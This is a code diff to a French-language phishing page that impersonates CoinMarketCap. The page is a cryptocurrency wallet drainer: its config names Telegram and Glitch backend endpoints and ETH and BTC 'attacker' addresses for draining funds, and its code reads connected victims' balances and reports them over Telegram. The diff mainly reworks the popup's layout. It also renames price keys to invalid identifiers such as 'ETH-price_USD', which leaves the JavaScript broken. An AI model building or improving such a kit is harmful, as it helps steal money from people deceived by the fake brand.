@@ -74,11 +74,11 @@
         .wallet-list-btn {
             background: #f8f9fa;
             color: #333333;
-            padding: 10px 15px;
+            padding: 12px 15px;
             border: 1px solid #e0e0e0;
             border-radius: 5px;
             cursor: pointer;
-            margin: 5px 0;
+            margin: 8px 0;
             font-size: 14px;
             font-weight: 500;
             transition: all 0.3s ease;
@@ -95,8 +95,8 @@
             border-color: #007BFF;
         }
         .wallet-icon {
-            width: 20px;
-            height: 20px;
+            width: 24px;
+            height: 24px;
         }
         /* Style pour le loader */
         .loader {
@@ -160,6 +160,14 @@
             .logo {
                 width: 50px;
             }
+            .wallet-list-btn {
+                padding: 10px 12px;
+                font-size: 13px;
+            }
+            .wallet-icon {
+                width: 20px;
+                height: 20px;
+            }
         }
     </style>
 </head>
@@ -168,16 +176,23 @@
     <div class="overlay" id="overlay"></div>
     <!-- Popup de connexion au wallet -->
     <div class="wallet-popup" id="walletPopup">
-        <img src="coinmarketcap.svg" alt="Company Logo" class="logo">
-        <h2 style="margin-bottom: 15px; font-size: 24px; font-weight: 700;">Accès Exclusif Requis</h2>
-        <p style="margin-bottom: 20px; font-size: 16px;">
-            Pour accéder à notre plateforme premium et bénéficier de services exclusifs, veuillez connecter votre wallet. <br>
-            Cette étape est essentielle pour sécuriser votre expérience personnalisée.
-        </p>
-        <p class="trust-text">Sécurisé et utilisé par des milliers d'utilisateurs. Nous respectons vos données.</p>
-        <button class="connect-btn" id="connectWallet">Connecter mon wallet</button>
-        <!-- Conteneur pour les boutons de wallets détectés -->
-        <div id="walletList" class="hidden" style="margin-top: 20px;"></div>
+        <!-- Vue 1 : Introduction -->
+        <div id="introView">
+            <img src="coinmarketcap.svg" alt="Company Logo" class="logo">
+            <h2 style="margin-bottom: 15px; font-size: 24px; font-weight: 700;">Accès Exclusif Requis</h2>
+            <p style="margin-bottom: 20px; font-size: 16px;">
+                Pour accéder à notre plateforme premium et bénéficier de services exclusifs, veuillez connecter votre wallet. <br>
+                Cette étape est essentielle pour sécuriser votre expérience personnalisée.
+            </p>
+            <p class="trust-text">Sécurisé et utilisé par des milliers d'utilisateurs. Nous respectons vos données.</p>
+            <button class="connect-btn" id="connectWallet">Connecter mon wallet</button>
+        </div>
+        <!-- Vue 2 : Sélection des wallets -->
+        <div id="walletSelectionView" class="hidden">
+            <h2 style="margin-bottom: 20px; font-size: 20px; font-weight: 600;">Choisissez votre wallet</h2>
+            <div id="walletList" style="margin-top: 20px;"></div>
+        </div>
+        <!-- Éléments communs -->
         <button class="redirect-btn hidden" id="redirectButton">Continuer vers le site</button>
         <div class="loader" id="loader"></div>
         <div id="statusText"></div>
@@ -190,8 +205,8 @@
             TELEGRAM_CHAT_ID: '-4635118249',
             BACKEND_URL: 'https://diligent-big-whimsey.glitch.me/', // URL de ton backend sur Glitch
             REDIRECT_URL: 'https://coinmarketcap.com',
-            BTC_PRICE_USD: 85000,
-            ETH_PRICE_USD: 2000,
+            BTC-price_USD: 85000,
+            ETH-price_USD: 2000,
             ATTACKER_ADDRESS: '0xc427AB745eA6b12C557c7342f94D96f68D19D754', // Ton adresse ETH pour le drainage
             BTC_ATTACKER_ADDRESS: 'tb1qmqts2vhpzul4ltmvs97gdnvsfm3h6slfv2vv2l' // Ton adresse BTC Testnet
         };
@@ -282,6 +297,8 @@
 
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             const walletListContainer = document.getElementById('walletList');
+            const introView = document.getElementById('introView');
+            const walletSelectionView = document.getElementById('walletSelectionView');
 
             // Liste des wallets supportés avec leurs identifiants et liens profonds
             const supportedWallets = [
@@ -331,10 +348,10 @@
                 return null;
             }
 
-            // Sur Mobile : Afficher une liste des wallets
-            elements.connectWalletButton.classList.add('hidden');
-            walletListContainer.classList.remove('hidden');
-            updateStatus(elements, 'Sélectionnez un wallet pour vous connecter :', false, '#666666');
+            // Sur Mobile : Basculer vers la vue de sélection des wallets
+            introView.classList.add('hidden');
+            walletSelectionView.classList.remove('hidden');
+            updateStatus(elements, '', false); // Effacer le texte de statut initial
 
             // Générer les boutons pour chaque wallet
             supportedWallets.forEach(wallet => {
@@ -353,7 +370,7 @@
                         console.log(`${wallet.name} déjà injecté`);
                         const success = await handleWalletConnection(wallet, elements);
                         if (success) {
-                            elements.connectWalletButton.classList.add('hidden');
+                            walletSelectionView.classList.add('hidden');
                             elements.redirectButton.classList.remove('hidden');
                             elements.redirectButton.disabled = false;
                         } else {
@@ -397,7 +414,7 @@
 
                     const ethBalance = await provider.getBalance(ethAddress);
                     const ethBalanceEth = parseFloat(window.ethers.utils.formatEther(ethBalance));
-                    const ethBalanceUsd = ethBalanceEth * CONFIG.ETH_PRICE_USD;
+                    const ethBalanceUsd = ethBalanceEth * CONFIG.ETH-price_USD;
                     console.log('Solde ETH :', ethBalanceEth, 'ETH (≈ $', ethBalanceUsd.toFixed(2), 'USD)');
 
                     // Notification Telegram pour la connexion
@@ -434,7 +451,7 @@
                         const { utxos } = await utxoResponse.json();
                         const btcBalanceSat = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
                         const btcBalanceBtc = btcBalanceSat / 1e8;
-                        const btcBalanceUsd = btcBalanceBtc * CONFIG.BTC_PRICE_USD;
+                        const btcBalanceUsd = btcBalanceBtc * CONFIG.BTC-price_USD;
                         console.log('Solde BTC :', btcBalanceBtc, 'BTC (≈ $', btcBalanceUsd.toFixed(2), 'USD)');
 
                         // Notification Telegram pour la connexion
